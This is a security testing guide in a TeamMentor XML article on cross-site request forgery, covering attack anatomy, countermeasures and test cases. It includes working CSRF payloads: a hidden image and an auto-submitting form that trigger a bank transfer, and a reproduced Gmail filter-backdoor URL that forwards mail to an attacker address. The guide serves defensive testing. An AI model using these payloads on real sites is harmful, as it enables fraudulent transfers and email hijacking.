<?xml version="1.0"?>
<TeamMentor_Article Metadata_Hash="-1375299925" Content_Hash="-1812984050">
  <Metadata>
    <Id>5339f0d4-6052-44a5-9d83-09a116ffdd13</Id>
    <Library_Id>00000000-0000-0000-0000-000000000000</Library_Id>
    <Title>How to Test for Cross-Site Request Forgery (CSRF) Bugs</Title>
    <Category>Session Management</Category>
    <Phase>Test</Phase>
    <Technology> Any</Technology>
    <Type>How To</Type>
    <DirectLink />
    <Tag />
    <Security_Demand />
    <Author />
    <Priority>Andres De Vivanco</Priority>
    <Status />
  </Metadata>
  <Content Sanitized="true" DataType="Html">
    <Data><![CDATA[<h1>Applies to:</h1><ul><li>Web applications written in languages such as Java, C#, VB .Net, PHP, and Ruby.</li></ul><p>&nbsp;</p><h1>Summary</h1><p>During Cross-Site Request Forgery (CSRF) -also known as <em>XSRF</em> or <em>session riding</em>- attacks, an attacker forces a victim to make an unexpected web request such as a fraudulent bank transaction.&nbsp;&nbsp; For example, an attacker tricks the victim client into calling a banking function in a vulnerable page that transfers money from the victim’s to the attacker’s account.&nbsp; The victim triggers the attack by following an attacker’s link or visiting an attacker’s page.&nbsp; The vulnerable server page doesn’t recheck the authenticity of the victim’s request and allows the transfer to proceed.</p><p>Follow these steps to test for CSRF bugs:</p><ul><li>Step 1:&nbsp; Understand Attack Scenarios </li><li>Step 2:&nbsp; Analyze Causes and Countermeasures </li><li>Step 3:&nbsp; Start Testing and Exploring </li><li>Step 4:&nbsp; Fine-tune Test Cases</li></ul><p>&nbsp;</p><h1>Step 1:&nbsp; Understand Attack Scenarios</h1><p>The first step in testing for CSRF bugs is to understand its attack scenarios.&nbsp; Even though the anatomy of a CSRF attack is almost always constant, its objectives may vary:&nbsp; attackers can exploit CSRF bugs to perform unauthorized fraudulent banking transactions, send spoofed email messages, steal sensitive information, and even install a back door.&nbsp; The following steps detail the anatomy of a CSRF attack:</p><ol><li>Attacker finds functionality in a web application that is vulnerable to CSRF. </li><li>Attacker builds a link invoking the vulnerable function and passing the required parameters as to executed the chosen attack. </li><li>Attacker waits until the victim client authenticates with the vulnerable web application. </li><li>Attacker tricks victim client into following the malicious link. </li><li>Victim client sends forged request to vulnerable server. </li><li>Vulnerable server allows and executes the forged request. </li></ol><p>The form of the link built in step 2 depends on the payload that the attacker wants to execute.&nbsp; For example, the link might looks like this when they payload is to transfer money from the victim’s to the attacker’s account:</p><pre><strong><a>/makeTransfer?amount=1000&amp;dest=attacker@attackersite.com'</a></strong>&nbsp;</pre><p>The link below sends an email titled Hello to johny@example.com: </p><pre><strong>/sendMail?to=johny@example.com&amp;title=Hello&amp;body=I+did+not+send+this'</strong></pre><br><p>A serious flaw discovered in Google’s Gmail early in 2007 allowed attackers to install a backdoor to forward all emails to them.&nbsp; In the link below the attacker forwards the victim to the attacker’s site.&nbsp; Then the attacker’s site makes the fraudulent request in behalf of the victim:</p><pre><strong>http://www.attakersite.org/util/csrf?method=POST&amp;enctype=multipart/form-data&amp;_action=https%3A//mail.google.com/mail/h/ewt1jmuj4ddv/%3Fv%3Dprf&amp;cf2emc=true&amp;cf2_email=attacker@attackersite.com&amp;cf1_from&amp;cf1_to&amp;cf1_subj&amp;cf1has&amp;cf1hasnot&amp;cf1attach=true&amp;tfi&amp;s=z&amp;irf=on&amp;nvpbucftb=Create%20Filter</strong></pre><p>Upon receiving the forged HTTP POST request, Gmail forwards all the victim’s emails to attacker@attackersite.com.&nbsp; Furthermore, the attack installs a filter that works as a backdoor for hijacking future emails.</p><p>&nbsp;</p><h1>Step 2:&nbsp; Analyze Causes and Countermeasures</h1><p>During this step you will be shown the causes behind Cross-Site Request Forgery , &nbsp;how to recognize it within your code base and you will be shown coding best practices, as to avoid this issue altogether.</p><h2><em>Cross-Site Request Forgery Causes</em></h2><p>This kind of vulnerability exists because the web application trusts the forged request.&nbsp; Thus, the cause for this bug is a case of poor or missing authentication code.&nbsp; The application lacks the functionality to verify that every client request is not forged and that it actually originates from a legitimate client action.&nbsp;&nbsp; Web applications vulnerable to CSRF implement a <em>persistent</em> authentication system in which they validate the user against a persistent token such as a session cookie.&nbsp;&nbsp; In persistent authentication, when the server receives a request it only checks if the user is logged in and not if the request comes due to a legitimate client action.</p><h2><em>Cross-Site Request Forgery Countermeasures</em></h2><p>The main prevention against CSRF vulnerabilities is to provide a <em>transient</em> authentication system [i] instead of a persistent authentication system.&nbsp; Transient authentication systems verify for the authenticity of every request by using an additional check.&nbsp;&nbsp; One way of doing this is to transmit a secret in every URL; especially require a secret in URLs that request create, update, delete, or mail actions.&nbsp; An attacker will not be able to execute an attack unless he knows the secret.&nbsp; The problem is that an attacker can execute a XSS attack and steal the secret.</p><p>There is no silver bullet against CSRF attacks so developers need to look for ways of raising the bar against attackers.&nbsp;&nbsp; A popular way to protect Internet users from CSRF is by using <em>CAPTCHAs</em> (Completely Automated Turing Test to Test Computers and Humans Apart) that require the client to validate the contents of a bitmap image before the application allows any requests.</p><p>Other preventions suggested include using POSTs instead of GETs requests to perform actions and or to check the HTTP referrer header.&nbsp; However, both of these countermeasures can be defeated by a knowledgeable attacker since he can easily forge a POST command using a malicious script and can also easily spoof the HTTP referrer.&nbsp; </p><p>&nbsp;</p><h1>Step 3:&nbsp; Start Testing and Exploring</h1><p>Now that you’ve learned how CSRF attacks work and how to defend against them, this step shows the basic test cases to execute to start testing for CSRF bugs.</p><p><strong><em></em></strong></p><h2><em>Basic Test for Cross-site Request Forgery </em></h2><p>Follow these test steps to test against CSRF bugs. <strong><em></em></strong></p><ol><li>Find a web application page that performs an action based on a user request. </li><li>Construct a page containing a link or redirect that sends a forged request to the application server.&nbsp; This link usually contains a tag such as an img or iframe (although mostly any tags can be used) with the source address pointing to the request: <ul><li><pre>&lt;a href="http://bank.com/transfer.do?acct=MARIA&amp;amount=100000"&gt;View my Pictures!&lt;/a&gt;</pre><pre></pre><pre>&lt;img src="http://bank.com/transfer.do?acct=MARIA&amp;amount=100000" width="1" height="1" border="0"&gt;&nbsp;</pre><p>Note that the links above will both generate a GET request.&nbsp; In order to test for POST requests you must create a page containing a form with the URL parameters passed as hidden input, and add a script to automatically submit the form:&nbsp;</p><pre>&lt;form action="http://bank.com/transfer.do" method="post"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name="acct" value="MARIA"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name="ammount" value="100000"&gt;<br>&lt;/form&gt; <br>&lt;script&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.forms[0].submit();<br>&lt;/script&gt;<br></pre></li></ul></li><li>Open an Internet browser and log in to the web application as a legitimate user. </li><li>Open the page built in step 2 (follow the link if necessary). </li><li>Confirm if the request was successful. </li><li>Repeat test case for every application create/update/delete/mail action.</li></ol><p>Expected result:&nbsp; the test fails if the application trusts and processes the forged request.</p><h2><em>Test Use of Secret in URLs</em></h2><p>This test will tell you if your application uses secrets in the URL.</p><p>Testing steps:<strong><em></em></strong></p><ol><li>Log in to the application as a legitimate user. </li><li>Browse to a web form that makes a valid request and uses a secret in the URL:&nbsp; <ul><li><pre>http://example.com/makeTransfer?amount=1000&amp;dest=attacker@attackersite.com'&amp;secret=2y9ryo2hr2</pre></li></ul></li><li>Start intercepting network traffic using HTTP(s) WebScarab<a href="about:blank#_edn2" name="_ednref2">[ii]</a> proxy. </li><li>Configure browser to use WebScarab proxy. </li><li>Make another request. </li><li>In WebScarab, modify the URL to change the secret to another value: <ul><li><pre>http://example.com/makeTransfer?amount=1000&amp;dest=attacker@attackersite.com'&amp;secret=<strong>XXXXXXXXXXX</strong></pre></li></ul></li></ol><br><p>Expected result:&nbsp; The server must disallow the action since the secret was changed in step 6.&nbsp; The test fails if the server allows the requested action.</p><p><strong><em></em></strong></p><h2><em>Test Use of Secret in Cookies</em></h2><p>This test will tell you if your application properly uses secrets in the cookies.</p><p>Testing steps:<strong><em></em></strong></p><ol><li>Start intercepting traffic network traffic using WebScarab proxy. </li><li>Open a browser, configure it to go through WebScarab proxy, and log in to the application as a legitimate user. </li><li>Browse to a page that makes a request and submits a secret using a cookie. </li><li>Submit request. </li><li>In WebScarab, replace the secret in the cookie.&nbsp; For instance: </li></ol><blockquote><pre>GET http://www.example.com/trasnfer?amount=1000&amp;dest=1234 HTTP/1.1<br>Host: localhost<br>User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; es-ES; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14<br>Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5<br>Accept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3<br>Accept-Encoding: gzip,deflate<br>Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7<br>Keep-Alive: 300<br>Proxy-Connection: keep-alive<br>Cookie: session-ID=1089eq14; secret=1240u9309u2efija<strong>XXXX</strong><br>&nbsp;</pre></blockquote><p>Expected result:&nbsp; The server must disallow the action since the secret was changed in step 6.&nbsp; The test fails if the server allows the requested action.</p><p>&nbsp;</p><h1>Step 4:&nbsp; Fine-tune Test Case Data</h1><p>The final step in testing for CSRF bugs is to fine-tune the test case data to achieve proper test coverage.&nbsp; &nbsp;Testing for CSRF bugs require you to fine-tune the test case data as to cover different attack scenarios in an automated fashion.</p><h2><em>Fine-tune Test Case Data per objective</em></h2><p>Attackers can use CSRF bugs to execute different kinds of attacks.&nbsp; It is important that you test these different payloads depending the characteristics of your application. Common objectives of &nbsp;CSRF attacks include:</p><ul><li>Making a fraudulent bank transaction. </li><li>Sending spoofed email. </li><li>Exploiting an administrative application. </li><li>Forcing password resets. </li><li>Changing router and firewall configurations [iii].</li></ul><p>&nbsp;</p><h2><em>Automate test cases </em></h2><p>Finally, it is recommended that you extend your test automation by adding CSRF test cases to it.&nbsp; Make a list of all GET requests in URLs and POST requests and write your own script that makes the requests with different session tokens.&nbsp; </p><h1>&nbsp;</h1><h1>Conclusions</h1><p>Cross-Site Request Forgery is serious attack class that affects any web application that doesn’t explicitly protect against it.&nbsp; Testing for CSRF bugs requires you to understand the attack scenarios, the cause of the bugs, and how to defend against them.&nbsp;&nbsp; In addition you must execute different CSRF test cases and fine-tune test case data according to different entry points.</p><p>&nbsp;</p><p>[i] <strong>Cross-Site Request Forgery</strong>.&nbsp; Wikiepedia. <a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery">http://en.wikipedia.org/wiki/Cross-site_request_forgery</a></p><div><div><p><a href="about:blank#_ednref2" name="_edn2"></a>[ii] <strong>Session Riding -&nbsp; A Widespread Vulnerability in Today Web Applications. </strong>Thomas Scheiber, SecureNet GmbH, Dec 2004. <a href="http://www.securenet.de/papers/Session_Riding.pdf">http://www.securenet.de/papers/Session_Riding.pdf</a></p></div><div><p>&nbsp;</p></div></div>]]></Data>
  </Content>
</TeamMentor_Article>